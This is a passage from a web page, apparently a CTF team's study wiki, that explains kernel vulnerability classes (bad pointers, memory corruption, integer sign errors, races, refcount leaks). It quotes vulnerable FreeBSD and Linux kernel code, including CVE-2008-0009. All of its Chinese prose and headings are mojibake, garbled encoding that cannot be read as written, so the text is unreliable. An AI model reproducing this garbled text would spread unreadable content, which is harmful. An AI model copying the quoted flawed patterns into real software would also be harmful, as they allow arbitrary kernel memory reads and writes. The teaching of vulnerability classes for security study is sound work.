<td>ç»•è¿‡åæ¼æ´žåˆ©ç”¨ä¿æŠ¤æŽªæ–½</td>
<td>è¿™è¦æ±‚è¶Šæ¥è¶Šå¤æ‚çš„æ–¹æ³•</td>
<td>å¤§éƒ¨åˆ†ä¿æŠ¤æŽªæ–½åœ¨å†…æ ¸æ€ï¼Œä½†å¹¶ä¸èƒ½ä¿æŠ¤å†…æ ¸æœ¬èº«ã€‚æ”»å‡»è€…ç”šè‡³èƒ½ç¦ç”¨å¤§éƒ¨åˆ†ä¿æŠ¤æŽªæ–½</td>
</tr>
</tbody>
</table>
<h2 id="_26">å†…æ ¸æ¼æ´žåˆ†ç±»</h2>
<h3 id="_27">æœªåˆå§‹åŒ–çš„ã€æœªéªŒè¯çš„ã€å·²æŸåçš„æŒ‡é’ˆè§£å¼•ç”¨</h3>
<p>è¿™ç±»æ¼æ´žæ¶µç›–äº†æ‰€æœ‰ä½¿ç”¨æŒ‡é’ˆçš„æƒ…å†µï¼Œæ‰€æŒ‡å†…å®¹é­åˆ°ç ´åã€æ²¡æœ‰è¢«æ­£ç¡®è®¾ç½®ã€æˆ–è€…æ˜¯æ²¡æœ‰åšè¶³å¤Ÿçš„éªŒè¯ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªé™æ€å£°æ˜Žçš„æŒ‡é’ˆè¢«åˆå§‹åŒ–ä¸º NULLï¼Œä½†å…¶ä»–æƒ…å†µä¸‹è¿™äº›æŒ‡é’ˆè¢«æ˜Žç¡®åœ°èµ‹å€¼ä¹‹å‰ï¼Œéƒ½æ˜¯æœªåˆå§‹åŒ–çš„ï¼Œå®ƒçš„å€¼æ˜¯å­˜æ”¾æŒ‡é’ˆå¤„çš„å†…å­˜é‡Œçš„ä»»æ„å†…å®¹ã€‚ä¾‹å¦‚ä¸‹é¢è¿™æ ·ï¼ŒæŒ‡é’ˆè¢«å­˜æ”¾åœ¨æ ˆä¸Šï¼Œè€Œå®ƒçš„å†…å®¹æ˜¯ä¹‹å‰å‡½æ•°ç•™åœ¨æ ˆä¸Šçš„ "A" å­—ç¬¦ä¸²ï¼š</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void big_stack_usage() {
    char big[0x100];
    memset(big, 'A', 0x100);
    printf(&quot;Big stack: %p ~ %p\n&quot;, big, big+0x100);
}

void ptr_un_initialized() {
    char *p;
    printf(&quot;Pointer value: %p =&gt; %p\n&quot;, &amp;p, p);
}

int main() {
    big_stack_usage();
    ptr_un_initialized();
}
$ gcc -fno-stack-protector pointer.c
$ ./a.out
Big stack: 0x7fffd6b0e400 ~ 0x7fffd6b0e500
Pointer value: 0x7fffd6b0e4f8 =&gt; 0x4141414141414141
</code></pre>
<p>ä¸‹é¢çœ‹ä¸€ä¸ªçœŸå®žçš„ä¾‹å­ï¼Œæ¥è‡ª FreeBSD8.0ï¼š</p>
<pre><code class="language-c">struct ucred ucred, *ucp;               // [1]
[...]
    refcount_init(&amp;ucred.cr_ref, 1);
    ucred.cr_uid = ip-&gt;i_uid;
    ucred.cr_ngroups = 1;
    ucred.cr_groups[0] = dp-&gt;i_gid;     // [2]
    ucp = &amp;ucred;
</code></pre>
<p>[1] å¤„çš„ <code>ucred</code> åœ¨æ ˆä¸Šè¿›è¡Œäº†å£°æ˜Žï¼Œç„¶åŽ <code>cr_groups[0]</code> è¢«èµ‹å€¼ä¸º <code>dp-&gt;i_gid</code>ã€‚é—æ†¾çš„æ˜¯ï¼Œ<code>struct ucred</code> ç»“æž„ä½“çš„å®šä¹‰æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="language-c">struct ucred {
    u_int   cr_ref;     /* reference count */
[...]
    gid_t   *cr_groups; /* groups */
    int     cr_agroups; /* Available groups */
};
</code></pre>
<p>æˆ‘ä»¬çœ‹åˆ° <code>cr_groups</code> æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œè€Œä¸”æ²¡æœ‰è¢«åˆå§‹åŒ–å°±ç›´æŽ¥ä½¿ç”¨ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œ<code>dp-&gt;i_gid</code> çš„å€¼åœ¨ <code>ucred</code> è¢«åˆ†é…æ—¶è¢«å†™å…¥åˆ°æ ˆä¸Šçš„ä»»æ„åœ°å€ã€‚</p>
<p>ç»§ç»­çœ‹æœªç»éªŒè¯çš„æŒ‡é’ˆï¼Œè¿™å¾€å¾€å‘ç”Ÿåœ¨å¤šç”¨æˆ·çš„å†…æ ¸åœ°å€ç©ºé—´ä¸­ã€‚æˆ‘ä»¬çŸ¥é“å†…æ ¸ç©ºé—´ä½äºŽç”¨æˆ·ç©ºé—´çš„ä¸Šé¢ï¼Œå®ƒçš„é¡µè¡¨åœ¨æ‰€æœ‰è¿›ç¨‹çš„é¡µè¡¨ä¸­éƒ½æœ‰å¤‡ä»½ã€‚æœ‰äº›è™šæ‹Ÿåœ°å€è¢«é€‰åšé™åˆ¶åœ°å€ï¼Œé™å®šåœ°å€ä»¥ä¸Šæˆ–ä»¥ä¸‹çš„è™šæ‹Ÿåœ°å€å½’å†…æ ¸ä½¿ç”¨ï¼Œè€Œå…¶ä»–çš„å½’ç”¨æˆ·ç©ºé—´ä½¿ç”¨ã€‚å†…æ ¸å‡½æ•°ä¹Ÿå°±æ˜¯ä½¿ç”¨è¿™ä¸ªé™å®šåœ°å€æ¥åˆ¤æ–­ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘çš„æ˜¯å†…æ ¸è¿˜æ˜¯ç”¨æˆ·ç©ºé—´ã€‚å¦‚æžœæ˜¯å‰è€…ï¼Œåˆ™å¯èƒ½åªéœ€åšå°‘é‡çš„éªŒè¯ï¼Œä½†å¦‚æžœæ˜¯åŽè€…ï¼Œåˆ™è¦æ ¼å¤–å°å¿ƒï¼Œå¦åˆ™ä¸€ä¸ªç”¨æˆ·ç©ºé—´çš„åœ°å€å¯èƒ½åœ¨ä¸å—æŽ§åˆ¶çš„æƒ…å†µä¸‹è¢«è§£å¼•ç”¨ã€‚</p>
<p>çœ‹ä¸€ä¸ª Linux çš„ä¾‹å­ï¼ŒCVE-2008-0009ï¼š</p>
<pre><code class="language-c">    error = get_user(base, &amp;iov-&gt;iov_base);     // [1]
    [...]
    if (unlikely(!base)) {
        error = -EFAULT;
        break;
    }
    [...]
    sd.u.userptr = base;                        // [2]
    [...]
    size = __splice_from_pipe(pipe, &amp;sd, pipe_to_user);
[...]
static int pipe_to_user(struct pipe_inode_info *pipe, struct pipe_buffer *buf, struct splice_desc *sd)
{
    if (!fault_in_pages_writeable(sd-&gt;u.userptr, sd-&gt;len)) {
        src = buf-&gt;ops-&gt;map(pipe, buf, 1);
        ret = __copy_to_user_inatomic(sd-&gt;u.userptr, src + buf-&gt;offset, sd-&gt;len);                               // [3]
        buf-&gt;ops-&gt;unmap(pipe, buf, src);
[...]
}
</code></pre>
<p>ä»£ç çš„ç¬¬ä¸€éƒ¨åˆ†æ¥è‡ªå‡½æ•° <code>vmsplice_to_user()</code>ï¼Œåœ¨ [1] å¤„ä½¿ç”¨äº† <code>get_user()</code> èŽ·å¾—äº†ç›®çš„æŒ‡é’ˆã€‚è¯¥ç›®çš„æŒ‡é’ˆæœªç»æ£€æŸ¥å°±é»˜è®¤å®ƒæ˜¯ä¸€ä¸ªç”¨æˆ·åœ°å€æŒ‡é’ˆï¼Œç„¶åŽé€šè¿‡ [2] ä¼ é€’ç»™äº† <code>__splice_from_pipe()</code>ï¼ŒåŒæ—¶ä¼ é€’å‡½æ•° <code>pipe_to_user</code> ä½œä¸º helper functionã€‚è¿™ä¸ªå‡½æ•°ä¾ç„¶æ˜¯æœªç»æ£€æŸ¥å°±è°ƒç”¨äº† <code>__copy_to_user_inatomic()</code>[3]ï¼Œå¯¹è¯¥æŒ‡é’ˆåšè§£å¼•ç”¨çš„æ“ä½œï¼Œå¦‚æžœæ”»å‡»è€…ä¼ é€’çš„æ˜¯ä¸€ä¸ªå†…æ ¸åœ°å€ï¼Œåˆ™åˆ©ç”¨è¯¥æ¼æ´žèƒ½å¤Ÿå†™å…¥ä»»æ„æ•°æ®åˆ°ä»»æ„çš„å†…æ ¸å†…å­˜ä¸­ã€‚è¿™é‡Œè¦çŸ¥é“çš„è¿˜æœ‰ Linux ä¸­ä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´çš„å‡½æ•°ï¼ˆä¾‹å¦‚ <code>__copy_to_user_inatomic()</code>ï¼‰æ˜¯ä¸ä¼šå¯¹æ‰€æä¾›çš„ç›®çš„ï¼ˆæˆ–æºï¼‰ç”¨æˆ·æŒ‡é’ˆåšä»»ä½•æ£€æŸ¥çš„ã€‚</p>
<p>æœ€åŽï¼Œä¸€ä¸ªè¢«æŸåçš„æŒ‡é’ˆå¾€å¾€æ˜¯å…¶ä»–æ¼æ´žçš„ç»“æžœï¼ˆä¾‹å¦‚ç¼“å†²åŒºæº¢å‡ºï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥ä»»æ„ä¿®æ”¹æŒ‡é’ˆçš„å†…å®¹ï¼ŒèŽ·å¾—æ›´å¤šçš„æŽ§åˆ¶æƒã€‚</p>
<h3 id="_28">å†…å­˜ç ´åæ¼æ´ž</h3>
<p>è¿™ç±»æ¼æ´žæ˜¯ç”±äºŽç¨‹åºçš„é”™è¯¯æ“ä½œé‡å†™äº†å†…æ ¸ç©ºé—´çš„å†…å­˜ï¼ˆåŒ…æ‹¬å†…æ ¸æ ˆå’Œå†…æ ¸å †ï¼‰å¯¼è‡´çš„ã€‚</p>
<p>å†…æ ¸æ ˆåœ¨æ¯æ¬¡è¿›ç¨‹è¿›å…¥åˆ°å†…æ ¸æ€æ—¶å‘æŒ¥ä½œç”¨ã€‚å†…æ ¸æ ˆä¸Žç”¨æˆ·æ ˆåŸºæœ¬ç›¸åŒï¼Œä½†ä¹Ÿæœ‰ä¸€äº›ç»†å°çš„å·®åˆ«ï¼Œä¾‹å¦‚å®ƒçš„å¤§å°é€šå¸¸æ˜¯å—é™åˆ¶çš„ã€‚å¦å¤–ï¼Œæ‰€æœ‰è¿›ç¨‹çš„å†…æ ¸æ ˆéƒ½æ˜¯ä¸€å—ç›¸åŒçš„å†…æ ¸åœ°å€ç©ºé—´ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥ä»–ä»¬å¼€å§‹äºŽä¸åŒçš„è™šæ‹Ÿåœ°å€å¹¶ä¸”å æ®ä¸åŒçš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚</p>
<p>ç”±äºŽå†…æ ¸æ ˆä¸Žç”¨æˆ·æ ˆçš„ç›¸ä¼¼æ€§ï¼Œå…¶å‘ç”Ÿæ¼æ´žçš„åœ°æ–¹ä¹Ÿå¤§ä½“ç›¸åŒï¼Œä¾‹å¦‚ä½¿ç”¨ä¸å®‰å…¨çš„å‡½æ•°ï¼ˆ<code>strcpy()</code>, <code>sprintf()</code> ç­‰ï¼‰ï¼Œæ•°ç»„è¶Šç•Œï¼Œç¼“å†²åŒºæº¢å‡ºç­‰ã€‚</p>
<p>é’ˆå¯¹å†…æ ¸å †çš„æ¼æ´žå¾€å¾€æ˜¯ç¼“å†²åŒºæº¢å‡ºé€ æˆçš„ã€‚é€šè¿‡æº¢å‡ºï¼Œé‡å†™äº†æº¢å‡ºå—åŽé¢çš„å—ï¼Œæˆ–è€…é‡å†™äº†ç¼“å­˜ç›¸å…³çš„å…ƒæ•°æ®ï¼Œéƒ½å¯èƒ½é€ æˆæ¼æ´žåˆ©ç”¨ã€‚</p>
<h3 id="_29">æ•´æ•°è¯¯ç”¨</h3>
<p>æ•´æ•°æº¢å‡ºå’Œç¬¦å·è½¬æ¢é”™è¯¯æ˜¯æœ€å¸¸è§çš„ä¸¤ç§æ•´æ•°è¯¯ç”¨æ¼æ´žã€‚è¿™ç±»æ¼æ´žå¾€å¾€ä¸å®¹æ˜“å•ç‹¬åˆ©ç”¨ï¼Œä½†å®ƒå¯èƒ½ä¼šå¯¼è‡´å¦å¤–çš„ä¸€äº›æ¼æ´žï¼ˆä¾‹å¦‚å†…å­˜æº¢å‡ºï¼‰çš„å‘ç”Ÿã€‚</p>
<p>æ•´æ•°æº¢å‡ºå‘ç”Ÿåœ¨å°†ä¸€ä¸ªè¶…å‡ºæ•´æ•°æ•°æ®å­˜å‚¨èŒƒå›´çš„æ•°èµ‹å€¼ç»™ä¸€ä¸ªæ•´æ•°å˜é‡ã€‚åœ¨ä¸åŠ æŽ§åˆ¶çš„åŠ æ³•å’Œä¹˜æ³•è¿ç®—ä¸­å¦‚æžœå †å‚è§è¿ç®—çš„å‚æ•°ä¸åŠ éªŒè¯ï¼Œä¹Ÿæœ‰å¯èƒ½å‘ç”Ÿæ•´æ•°æº¢å‡ºã€‚</p>
<p>ç¬¦å·è½¬æ¢é”™è¯¯å‘ç”Ÿåœ¨å°†ä¸€ä¸ªæ— ç¬¦å·æ•°å½“åšæœ‰ç¬¦å·æ•°å¤„ç†çš„æ—¶å€™ã€‚ä¸€ä¸ªç»å…¸çš„åœºæ™¯æ˜¯ï¼Œä¸€ä¸ªæœ‰ç¬¦å·æ•°ç»è¿‡æŸä¸ªæœ€å¤§å€¼æ£€æµ‹åŽä¼ å…¥ä¸€ä¸ªå‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°åªæŽ¥æ”¶æ— ç¬¦å·æ•°ã€‚</p>
<p>çœ‹ä¸€ä¸ª FreeBSD V6.0 çš„ä¾‹å­ï¼š</p>
<pre><code class="language-c">int fw_ioctl (struct cdev *dev, u_long cmd, caddr_t data, int flag, fw_proc *td)
{
[...]
    int s, i, len, err = 0;                                     [1]
    [...]
    struct fw_crom_buf *crom_buf = (struct fw_crom_buf *)data;  [2]
    [...]
    if (fwdev == NULL) {
    [...]
        len = CROMSIZE;
    [...]
    } else {
    [...]
        if (fwdev-&gt;rommax &lt; CSRROMOFF)
            len = 0;
        else
            len = fwdev-&gt;rommax - CSRROMOFF + 4;
    }
    if (crom_buf-&gt;len &lt; len)                                    [3]
        len = crom_buf-&gt;len;
    else
        crom_buf-&gt;len = len;
    err = copyout(ptr, crom_buf-&gt;ptr, len);                     [4]
}
</code></pre>
<p>[1] å¤„çš„ <code>len</code> æ˜¯æœ‰ç¬¦å·æ•´æ•°ï¼Œ<code>crom_buf-&gt;len</code> ä¹Ÿæ˜¯æœ‰ç¬¦å·æ•°å¹¶ä¸”è¯¥å€¼æ˜¯æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çš„ï¼Œå¦‚æžœå®ƒè¢«è®¾ä¸ºä¸€ä¸ªè´Ÿæ•°ï¼Œé‚£ä¹ˆæ— è®º <code>len</code> çš„å€¼æ˜¯ä»€ä¹ˆï¼Œ[3] å¤„çš„æ¡ä»¶éƒ½ä¼šæ»¡è¶³ã€‚ç„¶åŽåœ¨ [4] å¤„ï¼Œ<code>copyout()</code> è¢«è°ƒç”¨ï¼Œè¯¥å‡½æ•°åŽŸåž‹å¦‚ä¸‹ï¼š</p>
<pre><code class="language-c">int copyout(const void *__restrict kaddr, void *__restrict udaddr, size_t len) __nonnull(1) __nonnull(2);
</code></pre>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°çš„ç±»åž‹ <code>size_t</code> æ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ï¼Œæ‰€ä»¥å½“ <code>len</code> æ˜¯ä¸€ä¸ªè´Ÿæ•°çš„æ—¶å€™ï¼Œä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ­£æ•´æ•°ï¼Œé€ æˆä»»æ„å†…æ ¸å†…å­˜è¯»å–ã€‚</p>
<p>æ›´å¤šå†…å­˜å¯ä»¥å‚è§ç« èŠ‚ 3.1.2ã€‚</p>
<h3 id="_30">ç«žæ€æ¡ä»¶</h3>
<p>å¦‚æžœæœ‰ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šæ‰§è¡Œè€…å°†è¦æ‰§è¡ŒæŸä¸€åŠ¨ä½œå¹¶ä¸”æ‰§è¡Œç»“æžœä¼šç”±äºŽå®ƒä»¬æ‰§è¡Œé¡ºåºçš„ä¸åŒè€Œå®Œå…¨ä¸åŒæ—¶ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿäº†ç«žäº‰æ¡ä»¶ã€‚é¿å…ç«žäº‰æ¡ä»¶çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚é€šè¿‡é”ã€ä¿¡å·é‡ã€æ¡ä»¶å˜é‡ç­‰æ¥ä¿è¯å„ç§è¡ŒåŠ¨è€…ä¹‹é—´çš„åŒæ­¥æ€§ã€‚ç«žäº‰æ¡ä»¶ä¸­æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯å¯ç«žäº‰çª—å£çš„å¤§å°ï¼Œå®ƒå¯¹äºŽè§¦å‘ç«žæ€æ¡ä»¶çš„éš¾æ˜“è‡³å…³é‡è¦ï¼Œç”±äºŽè¿™ä¸ªåŽŸå› ï¼Œä¸€äº›ç«žæ€æ¡ä»¶çš„æƒ…å†µåªèƒ½åœ¨å¯¹ç§°å¤šå¤„ç†å™¨ï¼ˆSMPï¼‰ä¸­è¢«åˆ©ç”¨ã€‚</p>
<h3 id="bug">é€»è¾‘ bug</h3>
<p>é€»è¾‘ bug æœ‰å¾ˆå¤šç§ï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨æº¢å‡ºã€‚æˆ‘ä»¬çŸ¥é“å…±äº«èµ„æºéƒ½æœ‰ä¸€ä¸ªå¼•ç”¨è®¡æ•°ï¼Œå¹¶åœ¨è®¡æ•°ä¸ºé›¶æ—¶é‡Šæ”¾æŽ‰èµ„æºï¼Œä¿æŒè¶³å¤Ÿçš„å†…å­˜ç©ºé—´ã€‚æ“ä½œç³»ç»Ÿå¾€å¾€æä¾› get å’Œ put/drop è¿™æ ·çš„å‡½æ•°æ¥æ˜¾å¼åœ°å¢žåŠ å’Œå‡å°‘å¼•ç”¨è®¡æ•°ã€‚</p>
<p>çœ‹ä¸€ä¸ª FreeBSD V5.0 çš„ä¾‹å­ï¼š</p>
<pre><code class="language-c">int fpathconf(td, uap)
    struct thread *td;
    register struct fpathconf_args *uap;
{
    struct file *fp;
    struct vnode *vp;
    int error;
    if ((error = fget(td, uap-&gt;fd, &amp;fp)) != 0)      [1]
        return (error);
[...]
    switch (fp-&gt;f_type) {
    case DTYPE_PIPE:
    case DTYPE_SOCKET:
        if (uap-&gt;name != _PC_PIPE_BUF)
            return (EINVAL);                        [2]
        p-&gt;p_retval[0] = PIPE_BUF;
        error = 0;
        break;
[...]
out:
    fdrop(fp, td);                                  [3]
    return (error);
}
</code></pre>
<p><code>fpathconf()</code> ç³»ç»Ÿè°ƒç”¨ç”¨äºŽèŽ·å–ä¸€ä¸ªç‰¹å®šçš„å¼€æ”¾çš„æ–‡ä»¶æè¿°ç¬¦ä¿¡æ¯ã€‚æ‰€ä»¥è¯¥è°ƒç”¨å¼€å¤´ [1] å¤„é€šè¿‡ <code>fget()</code> èŽ·å–è¯¥æ–‡ä»¶æè¿°ç¬¦ç»“æž„çš„å¼•ç”¨ï¼Œç„¶åŽåœ¨é€€å‡ºçš„æ—¶å€™ [3] å¤„é€šè¿‡ <code>fdrop()</code> é‡Šæ”¾è¯¥å¼•ç”¨ã€‚ç„¶è€Œåœ¨ [2] å¤„çš„ä»£ç æ²¡æœ‰é‡Šæ”¾ç›¸å…³çš„å¼•ç”¨è®¡æ•°å°±ç›´æŽ¥è¿”å›žäº†ã€‚å¦‚æžœå¤šæ¬¡è°ƒç”¨ <code>fpathconf()</code> å¹¶è§¦å‘ [2] å¤„çš„è¿”å›žï¼Œåˆ™æœ‰å¯èƒ½å¯¼è‡´å¼•ç”¨è®¡æ•°å™¨çš„æº¢å‡ºã€‚</p>









  




                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      COMPASS & SUSTech 2023 CTF team
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.ebd0bdb7.min.js"></script>
      
    
  </body>
</html>